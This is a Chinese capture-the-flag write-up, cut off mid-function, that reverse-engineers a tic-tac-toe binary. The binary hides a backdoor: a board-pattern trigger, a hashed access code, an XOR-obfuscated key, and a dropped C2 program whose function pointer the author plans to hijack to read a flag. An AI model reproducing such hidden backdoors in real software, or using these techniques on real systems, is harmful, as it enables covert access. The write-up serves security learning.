接着程序中有几个 for 循环，我斗胆猜测一下，应该是初始化棋盘的。然后那个庞大的 while 循环里面，看了下，应该是负责显示棋盘，接收用户输入并设置棋盘。注意到它通过 `core::str::<impl str>::trim` 去除输入两端的垃圾字符，`core::str::<impl str>::split_whitespace` 想必就是将输入按空格分隔了，然后 `core::iter::traits::iterator::Iterator::filter_map` 对输入做了一些过滤，最后用 `core::iter::traits::iterator::Iterator::collect` 将结果整合起来进行后续的操作。

之后，`*(_QWORD *)v55 >= 5uLL` 和 `*v54 >= 5uLL` 的几个 if 应该就是检测输入的行列是否超出了棋盘大小。那就可以很自然的推断出外层 if `alloc::vec::Vec<T,A>::len(v81) == 2 && *(_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 0LL, &off_3A5190) < 5uLL && *(_QWORD *)<alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(v81, 1LL, &off_3A51A8) < 5uLL` 这一长串就是判断提供的输入是否是合法的两个行列数据，并且它们都在合法的范围内。之后又分别对行列数据范围做了检测，没问题就设置棋盘的对应元素。

之后 `alloc::vec::Vec<T,A>::push` 应该是把棋盘数据保存到 vector 中，用于后续 `tictactoe::check_winner` 判断哪一方胜出。任何一方胜出后都会跳转到 `LABEL_40` 回收内存。

`tictactoe::is_full`，看名字就知道肯定是检测棋盘被填满还没有分出胜负的情况，后续的 `std::io::stdio::_print` 来看也可以证实这一点，如果填满了就输出 `It's a draw!`.

目前还没发现任何有关后门的线索，哪怕是验证函数也没见它调用过。我们深入 `tictactoe::check_winner` 看看：

```c
char __fastcall tictactoe::check_winner(int a1, int a2, __int64 a3, int a4, int a5, int a6)
{
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v8; // rax
  __int64 v9; // rdx
  __int64 v10; // rax
  __int64 v11; // rdx
  int v12; // eax
  int v13; // edx
  int v14; // ecx
  int v15; // r8d
  int v16; // r9d
  __int64 v17; // rax
  __int64 v18; // rdx
  char **v19; // rsi
  __int64 v20; // rdx
  __int64 v21; // rax
  unsigned __int64 v22; // rdx
  int v23; // edx
  int v24; // ecx
  int v25; // r8d
  int v26; // r9d
  __int64 v28; // rdx
  int v29; // r8d
  int v30; // r9d
  int v31; // edx
  int v32; // ecx
  int v33; // r8d
  int v34; // r9d
  __int64 v35; // rax
  __int64 v36; // rdx
  int v37; // [rsp+0h] [rbp-358h]
  int v38; // [rsp+0h] [rbp-358h]
  struct _Unwind_Exception *v39; // [rsp+0h] [rbp-358h]
  int v40; // [rsp+8h] [rbp-350h]
  int v41; // [rsp+8h] [rbp-350h]
  int v42; // [rsp+8h] [rbp-350h]
  int v43; // [rsp+10h] [rbp-348h]
  int v44; // [rsp+10h] [rbp-348h]
  int v45; // [rsp+10h] [rbp-348h]
  int v46; // [rsp+18h] [rbp-340h]
  char v47; // [rsp+18h] [rbp-340h]
  int v48; // [rsp+18h] [rbp-340h]
  char v49; // [rsp+1Eh] [rbp-33Ah]
  int v50; // [rsp+20h] [rbp-338h]
  int v51; // [rsp+20h] [rbp-338h]
  int v52; // [rsp+28h] [rbp-330h]
  int v53; // [rsp+28h] [rbp-330h]
  int v54; // [rsp+30h] [rbp-328h]
  int v55; // [rsp+30h] [rbp-328h]
  struct _Unwind_Exception *v56; // [rsp+30h] [rbp-328h]
  char v57; // [rsp+36h] [rbp-322h]
  char v58; // [rsp+37h] [rbp-321h]
  int v59; // [rsp+38h] [rbp-320h]
  int v60; // [rsp+38h] [rbp-320h]
  int v61; // [rsp+38h] [rbp-320h]
  struct _Unwind_Exception *v62; // [rsp+40h] [rbp-318h]
  int v63; // [rsp+40h] [rbp-318h]
  int v64; // [rsp+48h] [rbp-310h]
  int v65; // [rsp+48h] [rbp-310h]
  int v66; // [rsp+50h] [rbp-308h]
  int v67; // [rsp+58h] [rbp-300h]
  int v68; // [rsp+60h] [rbp-2F8h]
  int v69; // [rsp+68h] [rbp-2F0h]
  int v70; // [rsp+88h] [rbp-2D0h]
  int v71; // [rsp+90h] [rbp-2C8h]
  int v72; // [rsp+98h] [rbp-2C0h]
  int v73; // [rsp+A0h] [rbp-2B8h]
  int v74; // [rsp+A8h] [rbp-2B0h]
  int v75; // [rsp+B0h] [rbp-2A8h]
  int v76; // [rsp+B8h] [rbp-2A0h]
  struct _Unwind_Exception *v77; // [rsp+C0h] [rbp-298h]
  int v78[2]; // [rsp+C8h] [rbp-290h]
  int v80; // [rsp+D8h] [rbp-280h] BYREF
  char v81; // [rsp+DFh] [rbp-279h]
  int v82[6]; // [rsp+E0h] [rbp-278h] BYREF
  _BYTE v83[24]; // [rsp+F8h] [rbp-260h] BYREF
  int v84[2]; // [rsp+110h] [rbp-248h] BYREF
  int v85[2]; // [rsp+118h] [rbp-240h]
  int v86[2]; // [rsp+120h] [rbp-238h]
  __int64 v87; // [rsp+128h] [rbp-230h] BYREF
  __int64 v88; // [rsp+130h] [rbp-228h] BYREF
  int v89; // [rsp+13Ch] [rbp-21Ch] BYREF
  _QWORD v90[3]; // [rsp+140h] [rbp-218h] BYREF
  _QWORD v91[3]; // [rsp+158h] [rbp-200h] BYREF
  _BYTE v92[48]; // [rsp+170h] [rbp-1E8h] BYREF
  _OWORD v93[3]; // [rsp+1A0h] [rbp-1B8h] BYREF
  __int128 v94; // [rsp+1D0h] [rbp-188h] BYREF
  __int128 v95; // [rsp+1E0h] [rbp-178h] BYREF
  __int128 v96; // [rsp+1F0h] [rbp-168h] BYREF
  int v97[2]; // [rsp+200h] [rbp-158h] BYREF
  int v98[2]; // [rsp+208h] [rbp-150h]
  int v99[2]; // [rsp+210h] [rbp-148h]
  int v100[2]; // [rsp+218h] [rbp-140h]
  int v101[2]; // [rsp+220h] [rbp-138h] BYREF
  int v102[4]; // [rsp+228h] [rbp-130h]
  int v103[2]; // [rsp+238h] [rbp-120h]
  _BYTE v104[48]; // [rsp+240h] [rbp-118h] BYREF
  _BYTE v105[48]; // [rsp+270h] [rbp-E8h] BYREF
  _QWORD v106[3]; // [rsp+2A0h] [rbp-B8h] BYREF
  unsigned __int64 v107; // [rsp+2B8h] [rbp-A0h]
  unsigned __int64 v108; // [rsp+2C0h] [rbp-98h] BYREF
  int v109[2]; // [rsp+2C8h] [rbp-90h] BYREF
  __int64 v110; // [rsp+2D0h] [rbp-88h]
  _QWORD v111[2]; // [rsp+2D8h] [rbp-80h] BYREF
  _QWORD v112[3]; // [rsp+2E8h] [rbp-70h] BYREF
  _QWORD v113[2]; // [rsp+300h] [rbp-58h] BYREF
  _QWORD v114[4]; // [rsp+310h] [rbp-48h] BYREF
  __int128 v115; // [rsp+330h] [rbp-28h] BYREF
  __int64 v116; // [rsp+340h] [rbp-18h]

  v80 = a2;
  tictactoe::obfuscate_pattern((int)v82, a2, a3, a4, a5, a6, v37, v40, v43, v46, v50, v52, v54, v59, v62, v64);
  alloc::string::String::new(v83);
  v6 = <alloc::vec::Vec<T,A> as core::ops::deref::Deref>::deref(a3);
  v76 = v7;
  v77 = (struct _Unwind_Exception *)v6;
  v8 = core::slice::<impl [T]>::iter(v6, v7);
  v72 = v9;
  v73 = v8;
  v10 = <I as core::iter::traits::collect::IntoIterator>::into_iter(v8, v9);
  v70 = v11;
  v71 = v10;
  *(_QWORD *)v84 = v10;
  *(_QWORD *)v85 = v11;
  while ( 1 )
  {
    *(_QWORD *)v86 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(v84);
    if ( !*(_QWORD *)v86 )
      break;
    v87 = **(_QWORD **)v86;
    v88 = *(_QWORD *)(*(_QWORD *)v86 + 8LL);
    v89 = *(_DWORD *)(*(_QWORD *)v86 + 16LL);
    core::fmt::rt::Argument::new_display(&v94, &v89);
    core::fmt::rt::Argument::new_display(&v95, &v87);
    core::fmt::rt::Argument::new_display(&v96, &v88);
    v93[0] = v94;
    v93[1] = v95;
    v93[2] = v96;
    core::fmt::Arguments::new_v1(v92, &unk_3A5110, v93);
    alloc::fmt::format((unsigned int)v91, (unsigned int)v92);
    v90[0] = v91[0];
    v90[1] = v91[1];
    v90[2] = v91[2];
    v35 = <alloc::string::String as core::ops::deref::Deref>::deref(v90);
    v41 = v36;
    v44 = v35;
    alloc::string::String::push_str(v83, v35, v36);
    core::ptr::drop_in_place<alloc::string::String>(v90);
  }
  v12 = <alloc::string::String as core::ops::deref::Deref>::deref(v82);
  regex::regex::string::Regex::new(
    (int)v101,
    v12,
    v13,
    v14,
    v15,
    v16,
    v38,
    v41,
    v44,
    v47,
    v51,
    v53,
    v55,
    v60,
    v63,
    v65,
    v66,
    v67,
    v68,
    v69,
    v13,
    v12,
    0,
    v70,
    v71,
    v72,
    v73,
    v74,
    v75,
    v76,
    v77,
    a1);
  if ( !*(_QWORD *)v101 )
  {
    v116 = *(_QWORD *)v103;
    v115 = *(_OWORD *)v102;
    core::result::unwrap_failed(aCalledResultUn, 43LL, &v115, &off_3A4EE0, &off_3A50D0);
  }
  *(_QWORD *)v97 = *(_QWORD *)v101;
  *(_QWORD *)v98 = *(_QWORD *)v102;
  *(_QWORD *)v99 = *(_QWORD *)&v102[2];
  *(_QWORD *)v100 = *(_QWORD *)v103;
  v17 = <alloc::string::String as core::ops::deref::Deref>::deref(v83);
  if ( (regex::regex::string::Regex::is_match(v97, v17, v18) & 1) != 0 )
  {
    v19 = &off_3A5100;
    core::fmt::Arguments::new_const(v104, &off_3A5100);
    std::io::stdio::_print(v104);
    if ( (tictactoe::validate_access_code((int)v104, (int)&off_3A5100, v31, v32, v33, v34) & 1) != 0 )
    {
      tictactoe::ask_for_credentials();
      v81 = 1;
    }
    else
    {
      v19 = &off_3A4FE8;
      core::fmt::Arguments::new_const(v105, &off_3A4FE8);
      std::io::stdio::_print(v105);
      v81 = 0;
    }
  }
  else
  {
    v106[0] = <I as core::iter::traits::collect::IntoIterator>::into_iter(0LL, 5LL);
    v106[1] = v20;
    while ( 1 )
    {
      v21 = core::iter::range::<impl core::iter::traits::iterator::Iterator for core::ops::range::Range<A>>::next(v106);
      v61 = v22;
      v106[2] = v21;
      v107 = v22;
      if ( !v21 )
        break;
      v108 = v107;
      if ( v107 >= 5 )
        core::panicking::panic_bounds_check(v108, 5LL, (__int64)&off_3A50E8);
      *(_QWORD *)v109 = core::slice::<impl [T]>::iter(*(_QWORD *)v78 + 20 * v108, 5LL);
      v110 = v28;
      v19 = (char **)&v80;
      if ( (<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::all(
              (int)v109,
              (int)&v80,
              v28,
              v109[0],
              v29,
              v30,
              (int)v39,
              v42,
              v45,
              v48,
              v28,
              v109[0],
              v56,
              v61) & 1) != 0 )
      {
        v81 = 1;
        goto LABEL_21;
      }
      v111[0] = 0LL;
      v111[1] = 5LL;
      v112[0] = *(_QWORD *)v78;
      v112[1] = &v108;
      v112[2] = &v80;
      v19 = (char **)v112;
      v49 = core::iter::traits::iterator::Iterator::all(v111, v112);
      if ( (v49 & 1) != 0 )
      {
        v81 = 1;
        goto LABEL_21;
      }
    }
    LODWORD(v19) = v78[0];
    v113[0] = 0LL;
    v113[1] = 5LL;
    v58 = core::iter::traits::iterator::Iterator::all(v113, *(_QWORD *)v78, &v80);
    if ( (v58 & 1) != 0 )
    {
      v81 = 1;
      goto LABEL_21;
    }
    LODWORD(v19) = v78[0];
    v114[0] = 0LL;
    v114[1] = 5LL;
    v57 = core::iter::traits::iterator::Iterator::all(v114, *(_QWORD *)v78, &v80);
    if ( (v57 & 1) == 0 )
    {
      v81 = 0;
      core::ptr::drop_in_place<regex::regex::string::Regex>((int)v97, v78[0], v23, v24, v25, v26, v39, v42);
      core::ptr::drop_in_place<alloc::string::String>(v83);
      core::ptr::drop_in_place<alloc::string::String>(v82);
      return v81 & 1;
    }
    v81 = 1;
  }
LABEL_21:
  core::ptr::drop_in_place<regex::regex::string::Regex>((int)v97, (int)v19, v23, v24, v25, v26, v39, v42);
  core::ptr::drop_in_place<alloc::string::String>(v83);
  core::ptr::drop_in_place<alloc::string::String>(v82);
  return v81 & 1;
}
```

发现一个叫做 `tictactoe::obfuscate_pattern` 的函数。

我对 `obfuscate` 这样的字眼比较敏感，并且函数名中有 `pattern`，直觉就告诉我这个函数应该是在检测某种棋盘布局，带着这样的直觉进入函数内部一探究竟，果不其然：

```c {29-46}
__int64 __fastcall tictactoe::obfuscate_pattern(__int64 a1)
{
  __int64 v1; // rdx
  __int64 v2; // rcx
  __int64 v3; // r8
  __int64 v4; // r9
  __int64 v5; // rax
  __int64 v6; // rdx
  int v7; // esi
  int v8; // edx
  int v9; // ecx
  int v10; // r8d
  int v11; // r9d
  int v13; // [rsp+8h] [rbp-50h]
  __int64 v14; // [rsp+28h] [rbp-30h]
  struct _Unwind_Exception v15; // [rsp+30h] [rbp-28h] BYREF

  v14 = alloc::alloc::exchange_malloc(144LL, 8LL);
  if ( (v14 & 7) != 0 )
    core::panicking::panic_misaligned_pointer_dereference(8LL, v14, &off_3A50B8);
  if ( !v14 )
    ((void (__fastcall __noreturn *)(char **, __int64, __int64, __int64, __int64, __int64))core::panicking::panic_null_pointer_dereference)(
      &off_3A50B8,
      8LL,
      v1,
      v2,
      v3,
      v4);
  *(_QWORD *)v14 = aX00;
  *(_QWORD *)(v14 + 8) = 4LL;
  *(_QWORD *)(v14 + 16) = "O:04>";
  *(_QWORD *)(v14 + 24) = 4LL;
  *(_QWORD *)(v14 + 32) = "X:11mode{";
  *(_QWORD *)(v14 + 40) = 4LL;
  *(_QWORD *)(v14 + 48) = "O:13~";
  *(_QWORD *)(v14 + 56) = 4LL;
  *(_QWORD *)(v14 + 64) = aX22;
  *(_QWORD *)(v14 + 72) = 4LL;
  *(_QWORD *)(v14 + 80) = aO31;
  *(_QWORD *)(v14 + 88) = 4LL;
  *(_QWORD *)(v14 + 96) = aX33;
  *(_QWORD *)(v14 + 104) = 4LL;
  *(_QWORD *)(v14 + 112) = "O:40X:44utf8info\\";
  *(_QWORD *)(v14 + 120) = 4LL;
  *(_QWORD *)(v14 + 128) = "X:44utf8info\\";
  *(_QWORD *)(v14 + 136) = 4LL;
  alloc::slice::<impl [T]>::into_vec(&v15, v14, 9LL);
  v5 = <alloc::vec::Vec<T,A> as core::ops::deref::Deref>::deref(&v15);
  v13 = v6;
  v7 = v5;
  alloc::slice::<impl [T]>::join(a1, v5, v6, 1LL, 0LL);
  core::ptr::drop_in_place<alloc::vec::Vec<&str>>((int)&v15, v7, v8, v9, v10, v11, &v15, v13);
  return a1;
}
```

```asm
[...]
.rodata:0000000000080368 aX00            db 'X:00'               ; DATA XREF: tictactoe::obfuscate_pattern+61↓o
.rodata:00000000000823BC aO04            db 'O:04'               ; DATA XREF: tictactoe::obfuscate_pattern+73↓o
.rodata:0000000000082884 aX11            db 'X:11'               ; DATA XREF: tictactoe::obfuscate_pattern+86↓o
.rodata:0000000000081C24 aO13            db 'O:13'               ; DATA XREF: tictactoe::obfuscate_pattern+99↓o
.rodata:000000000008190C aX22            db 'X:22'               ; DATA XREF: tictactoe::obfuscate_pattern+AC↓o
.rodata:0000000000080364 aO31            db 'O:31'               ; DATA XREF: tictactoe::obfuscate_pattern+BF↓o
.rodata:0000000000080654 aX33            db 'X:33'               ; DATA XREF: tictactoe::obfuscate_pattern+D2↓o
.rodata:000000000007FB80 aO40            db 'O:40'               ; DATA XREF: tictactoe::obfuscate_pattern+E5↓o
.rodata:000000000007FB84 aX44            db 'X:44'               ; DATA XREF: tictactoe::obfuscate_pattern+F8↓o
[...]
```

棋盘上每个空都是一个 `QWORD`，而 `aX00`，`aO31` 这样的名字，很容易让人联想到 `X` 和 `O` 棋子，说不定这后面的数字就代表这个棋子在棋盘中的坐标。

猜想是否正确，我们照着输一遍就是了：

```plaintext
Player O's turn. Enter row and column (0-4): 4 0
X - - - O
- X - O -
- - X - -
- O - X -
O - - - -

Player X's turn. Enter row and column (0-4): 4 4

--- Pattern Recognized! ---

--- Hidden Interface Unlocked ---
Enter Username:
```

Bingo ! 解锁隐藏界面。

现在我们成功进入了 `regex::regex::string::Regex::is_match(v97, v17, v18) & 1) != 0` 内部，调用了 `tictactoe::ask_for_credentials`。这个函数先获取输入作为 username，看了一下它只是随便接收了一个输入，并没有对其做任何判断，说明 username 可以是任意的。然后问我们要 Access Code，并通过 `tictactoe::sha256_hash` 将我们输入的 Access Code 转换为 `sha256`.

```c ins={115-116} del={128}
__int64 tictactoe::ask_for_credentials()
{
  int v0; // eax
  int v1; // edx
  int v2; // r9d
  __int64 v3; // rax
  __int64 v4; // rdx
  __int64 v5; // rdx
  int v6; // eax
  struct _Unwind_Exception *v7; // rdx
  int v8; // r9d
  __int64 v9; // rax
  __int64 v10; // rdx
  int v11; // eax
  int v12; // edx
  int v13; // edx
  int v14; // ecx
  int v15; // r8d
  int v16; // r9d
  int v18; // [rsp+0h] [rbp-2A8h]
  int v19; // [rsp+0h] [rbp-2A8h]
  int v20; // [rsp+8h] [rbp-2A0h]
  int v21; // [rsp+8h] [rbp-2A0h]
  int v22; // [rsp+10h] [rbp-298h]
  int v23; // [rsp+10h] [rbp-298h]
  int v24; // [rsp+18h] [rbp-290h]
  int v25; // [rsp+18h] [rbp-290h]
  int v26; // [rsp+20h] [rbp-288h]
  int v27; // [rsp+20h] [rbp-288h]
  char v28; // [rsp+28h] [rbp-280h]
  char v29; // [rsp+28h] [rbp-280h]
  struct _Unwind_Exception *v30; // [rsp+30h] [rbp-278h]
  int v31; // [rsp+38h] [rbp-270h]
  int v32[12]; // [rsp+C8h] [rbp-1E0h] BYREF
  _BYTE v33[24]; // [rsp+F8h] [rbp-1B0h] BYREF
  _BYTE v34[24]; // [rsp+110h] [rbp-198h] BYREF
  _BYTE v35[48]; // [rsp+128h] [rbp-180h] BYREF
  __int64 v36; // [rsp+158h] [rbp-150h] BYREF
  __int64 v37; // [rsp+160h] [rbp-148h] BYREF
  _QWORD v38[2]; // [rsp+168h] [rbp-140h] BYREF
  _BYTE v39[48]; // [rsp+178h] [rbp-130h] BYREF
  __int64 v40; // [rsp+1A8h] [rbp-100h] BYREF
  __int64 v41; // [rsp+1B0h] [rbp-F8h] BYREF
  int v42[6]; // [rsp+1B8h] [rbp-F0h] BYREF
  _BYTE v43[48]; // [rsp+1D0h] [rbp-D8h] BYREF
  __int128 v44; // [rsp+200h] [rbp-A8h] BYREF
  __int128 v45; // [rsp+218h] [rbp-90h] BYREF
  _BYTE v46[64]; // [rsp+228h] [rbp-80h] BYREF
  __int64 v47; // [rsp+268h] [rbp-40h]
  __int64 v48[3]; // [rsp+270h] [rbp-38h] BYREF
  __int64 v49; // [rsp+288h] [rbp-20h]
  __int64 v50[3]; // [rsp+290h] [rbp-18h] BYREF

  core::fmt::Arguments::new_const(v32, &off_3A4FF8);
  std::io::stdio::_print(v32);
  alloc::string::String::new(v33);
  alloc::string::String::new(v34);
  core::fmt::Arguments::new_const(v35, &off_3A5008);
  std::io::stdio::_print(v35);
  v36 = std::io::stdio::stdout();
  v49 = <std::io::stdio::Stdout as std::io::Write>::flush(&v36);
  if ( v49 )
  {
    v50[0] = v49;
    core::result::unwrap_failed(aCalledResultUn, 43LL, v50, &off_3A4F00, &off_3A5018);
  }
  v37 = std::io::stdio::stdin();
  v0 = std::io::stdio::Stdin::read_line(&v37, v33);
  core::result::Result<T,E>::expect(
    v0,
    v1,
    (int)aFailedToReadUs,
    23,
    (int)&off_3A5030,
    v2,
    v18,
    v20,
    v22,
    v24,
    v26,
    v28,
    v30,
    v31);
  v3 = <alloc::string::String as core::ops::deref::Deref>::deref(v33);
  v38[0] = core::str::<impl str>::trim(v3, v4);
  v38[1] = v5;
  core::fmt::Arguments::new_const(v39, &off_3A5048);
  std::io::stdio::_print(v39);
  v40 = std::io::stdio::stdout();
  v47 = <std::io::stdio::Stdout as std::io::Write>::flush(&v40);
  if ( v47 )
  {
    v48[0] = v47;
    core::result::unwrap_failed(aCalledResultUn, 43LL, v48, &off_3A4F00, &off_3A5058);
  }
  v41 = std::io::stdio::stdin();
  v6 = std::io::stdio::Stdin::read_line(&v41, v34);
  core::result::Result<T,E>::expect(
    v6,
    (int)v7,
    (int)aFailedToReadAc,
    26,
    (int)&off_3A5070,
    v8,
    v19,
    v21,
    v23,
    v25,
    v27,
    v29,
    v7,
    v6);
  v9 = <alloc::string::String as core::ops::deref::Deref>::deref(v34);
  v11 = core::str::<impl str>::trim(v9, v10);
  tictactoe::sha256_hash((int)v42, v11, v12);
  if ( (<alloc::string::String as core::cmp::PartialEq<&str>>::eq(v42, &off_3A4F88) & 1) == 0 )
  {
    core::ptr::drop_in_place<alloc::string::String>(v42);
    core::fmt::Arguments::new_const(v46, &off_3A5088);
    std::io::stdio::_print(v46);
    std::process::exit(1);
  }
  core::ptr::drop_in_place<alloc::string::String>(v42);
  core::fmt::rt::Argument::new_display(&v45, v38);
  v44 = v45;
  core::fmt::Arguments::new_v1(v43, &off_3A5098, &v44);
  std::io::stdio::_print(v43);
  tictactoe::execute_c2((int)v43, (int)&off_3A5098, v13, v14, v15, v16);
  core::ptr::drop_in_place<alloc::string::String>(v34);
  return core::ptr::drop_in_place<alloc::string::String>(v33);
}
```

```c
__int64 __fastcall tictactoe::sha256_hash(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // r8d
  int v5; // r9d
  __int64 result; // rax
  _QWORD *v8; // [rsp+10h] [rbp-178h]
  int v9[2]; // [rsp+18h] [rbp-170h]
  struct _Unwind_Exception *src; // [rsp+20h] [rbp-168h] BYREF
  int v11; // [rsp+28h] [rbp-160h]
  _BYTE v12[32]; // [rsp+90h] [rbp-F8h] BYREF
  _BYTE dest[112]; // [rsp+B0h] [rbp-D8h] BYREF
  _QWORD v14[3]; // [rsp+120h] [rbp-68h] BYREF
  _BYTE v15[48]; // [rsp+138h] [rbp-50h] BYREF
  _QWORD v16[2]; // [rsp+168h] [rbp-20h] BYREF
  _QWORD v17[2]; // [rsp+178h] [rbp-10h] BYREF

  <D as digest::digest::Digest>::new((unsigned int)&src);
  <D as digest::digest::Digest>::update((int)&src, a2, a3, v3, v4, v5, a3, a2, a1, a1, src, v11);
  memcpy(dest, &src, sizeof(dest));
  <D as digest::digest::Digest>::finalize((unsigned int)v12);
  core::fmt::rt::Argument::new_lower_hex(v17, v12);
  v16[0] = v17[0];
  v16[1] = v17[1];
  core::fmt::Arguments::new_v1(v15, &unk_7B290, v16);
  alloc::fmt::format((unsigned int)v14, (unsigned int)v15);
  result = *(_QWORD *)v9;
  *v8 = v14[0];
  v8[1] = v14[1];
  v8[2] = v14[2];
  return result;
}
```

之后 `(<alloc::string::String as core::cmp::PartialEq<&str>>::eq(v42, &off_3A4F88) & 1) == 0` 将转换结果与 `271c6d20f3ba3894199fc3f58b1087130ec340bf85e290b335f8dd4a09ce802f` 这串 hash 作对比，如果相同就调用 `tictactoe::execute_c2`.

好了，现在只要搞清楚什么样的明文加密成 `sha256` 后等于上述的值就好了。由于 hash 加密不可逆，有撞库的方法，不过我试了下没啥用，再次成功浪费了几分钟……

那难道我们破解不了明文了吗？别忘了我们还有 `tictactoe::decrypt_key`，看名字就知道和解密相关，现在全村的希望都压在这个函数上了……

```c {19-27}
_QWORD *__fastcall tictactoe::decrypt_key(_QWORD *a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rax
  __int64 v4; // rdx
  __int64 v5; // rax
  __int64 v6; // rdx
  int v8[6]; // [rsp+60h] [rbp-108h] BYREF
  int v9[6]; // [rsp+78h] [rbp-F0h] BYREF
  int v10[6]; // [rsp+90h] [rbp-D8h] BYREF
  _QWORD v11[3]; // [rsp+A8h] [rbp-C0h] BYREF
  _BYTE v12[48]; // [rsp+C0h] [rbp-A8h] BYREF
  _OWORD v13[3]; // [rsp+F0h] [rbp-78h] BYREF
  __int128 v14; // [rsp+128h] [rbp-40h] BYREF
  __int128 v15; // [rsp+138h] [rbp-30h] BYREF
  __int128 v16; // [rsp+148h] [rbp-20h] BYREF

  v1 = core::slice::<impl [T]>::iter(tictactoe::ENC_PART1);
  core::iter::traits::iterator::Iterator::map(v1, v2);
  core::iter::traits::iterator::Iterator::collect((int)v8);
  v3 = ((__int64 (__fastcall *)(void *, __int64))core::slice::<impl [T]>::iter)(&tictactoe::ENC_PART2, 7LL);
  core::iter::traits::iterator::Iterator::map(v3, v4);
  core::iter::traits::iterator::Iterator::collect((int)v9);
  v5 = core::slice::<impl [T]>::iter(tictactoe::ENC_PART3);
  core::iter::traits::iterator::Iterator::map(v5, v6);
  core::iter::traits::iterator::Iterator::collect((int)v10);
  core::fmt::rt::Argument::new_display(&v14, v8);
  core::fmt::rt::Argument::new_display(&v15, v9);
  core::fmt::rt::Argument::new_display(&v16, v10);
  v13[0] = v14;
  v13[1] = v15;
  v13[2] = v16;
  core::fmt::Arguments::new_v1(v12, &unk_7AE08, v13);
  alloc::fmt::format((unsigned int)v11, (unsigned int)v12);
  *a1 = v11[0];
  a1[1] = v11[1];
  a1[2] = v11[2];
  core::ptr::drop_in_place<alloc::string::String>(v10);
  core::ptr::drop_in_place<alloc::string::String>(v9);
  core::ptr::drop_in_place<alloc::string::String>(v8);
  return a1;
}
```

分析这个函数，看到它分 `ENC_PART1`、`ENC_PART2`、`ENC_PART3` 三部分处理。

```asm
.rodata:000000000007ADC5 ; tictactoe::ENC_PART1
.rodata:000000000007ADC5 _ZN9tictactoe9ENC_PART117hc9692e3072677d14E db 1Eh
.rodata:000000000007ADC5                                         ; DATA XREF: tictactoe::decrypt_key+11↓o
.rodata:000000000007ADC6                 db  69h ; i
.rodata:000000000007ADC7                 db  3Ch ; <
.rodata:000000000007ADC8                 db  6Bh ; k
.rodata:000000000007ADC9                 db  34h ; 4
.rodata:000000000007ADCA                 db  69h ; i
.rodata:000000000007ADCB                 db  2Eh ; .
.rodata:000000000007ADCC ; tictactoe::ENC_PART2
.rodata:000000000007ADCC _ZN9tictactoe9ENC_PART217h32e32663a27b062dE db  36h ; 6
.rodata:000000000007ADCC                                         ; DATA XREF: tictactoe::decrypt_key+52↓o
.rodata:000000000007ADCD                 db  23h ; #
.rodata:000000000007ADCE                 db  3Bh ; ;
.rodata:000000000007ADCF                 db  6Dh ; m
.rodata:000000000007ADD0                 db  6Bh ; k
.rodata:000000000007ADD1                 db  39h ; 9
.rodata:000000000007ADD2                 db  6Dh ; m
.rodata:000000000007ADD3 ; tictactoe::ENC_PART3
.rodata:000000000007ADD3 _ZN9tictactoe9ENC_PART317ha3eec3bbd5f1dfdbE db 6Eh
.rodata:000000000007ADD3                                         ; DATA XREF: tictactoe::decrypt_key:loc_12DDF1↓o
.rodata:000000000007ADD4                 db  39h ; 9
.rodata:000000000007ADD5                 db  6Dh ; m
.rodata:000000000007ADD6                 db  6Ah ; j
.rodata:000000000007ADD7                 db  69h ; i
.rodata:000000000007ADD8                 db  3Dh ; =
.rodata:000000000007ADD9                 db  3Bh ; ;
.rodata:000000000007ADDA                 db  37h ; 7
.rodata:000000000007ADDB                 db  69h ; i
```

分别对每一部分进行 `core::iter::traits::iterator::Iterator::map` 操作，然后 `core::iter::traits::iterator::Iterator::collect` 取操作后的结果。之后 `core::fmt::rt::Argument::new_display` 将这三部分分别转换为可打印值，一般用于格式化字符串。不过这里通过 `v13` 数组将这些值拼到一块。`core::fmt::Arguments::new_v1` 用于将合并后的值转换为格式化参数，用于 `alloc::fmt::format`。最后将结果放到 `a1` 数组中返回。

回想一下之前学过的一点 rust 语法，`map` 内部一般都会有一个闭包（函数），用于对迭代器中的每一个元素进行一些操作。看函数窗口，我们发现 `tictactoe::decrypt_key::{{closure}}` 函数，显然，这就是闭包了。

一共有三个，每一个都一样：

```c
__int64 __fastcall tictactoe::decrypt_key::{{closure}}(__int64 a1, _BYTE *a2)
{
  return *a2 ^ 0x5Au;
}
```

闭包对每一个元素进行 `^ 0x5Au` 的操作。即对三个 `ENC_PART` 的每一个元素都进行这样的异或。那我们只要手动提取出完整的 `ENC_PART`，然后对每一个 byte 都进行这样的异或，就得到了 Access Code.

终于，我们得到了 `/tmp/C2_executable`，但是这个程序并没有直接提供 shell 或者查看 flag 的功能，我们还得继续分析，把它 pwn 掉。好一个一波三折……

好在，生成的 C2 程序不再是 Rust 写的了……

```c del={4}
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  for ( agent = malloc(0x10uLL); ; executeAction(agent) )
  {
    displayMenu();
    processInput();
  }
}
```

```c
__int64 __fastcall executeAction(__int64 (**a1)(void))
{
  return (*a1)();
}
```

如上，for 循环中先 malloc 了 `0x10` 的大小，将得到的地址给到 `agent`。当一轮循环结束后就会去执行 `executeAction`，这个函数将传入的 `agent` 转换为 `__int64 (**a1)(void)`，即一个指向返回 `__int64` 的无参数函数指针的指针。调用这个函数，会将 `(*a1)()` 作为返回，即解引用这个二级指针，得到函数指针，并将其作为函数执行。

我们注意到函数列表中有这样一个后门函数：

```c
unsigned __int64 getSecret()
{
  FILE *stream; // [rsp+8h] [rbp-D8h]
  char s[200]; // [rsp+10h] [rbp-D0h] BYREF
  unsigned __int64 v3; // [rsp+D8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(s, 200, stream);
    fprintf(stdout, "%s\n", s);
    fclose(stream);
  }
  else
  {
    perror("couldn't open flag.txt");
  }
  return v3 - __readfsqword(0x28u);
}
```

那么思路就很清楚了，想办法让 `agent` 的值等于 `getSecret` 的地址即可。

继续看菜单选项函数：

```c
int processInput()
{
  __int64 UserInput; // rax
  _QWORD *v1; // rbx

  __isoc99_scanf(" %c", option);
  option[0] = toupper(option[0]);
  switch ( option[0] )
  {
    case 'A':
      LODWORD(UserInput) = (_DWORD)agent;
      *agent = beginoperation;
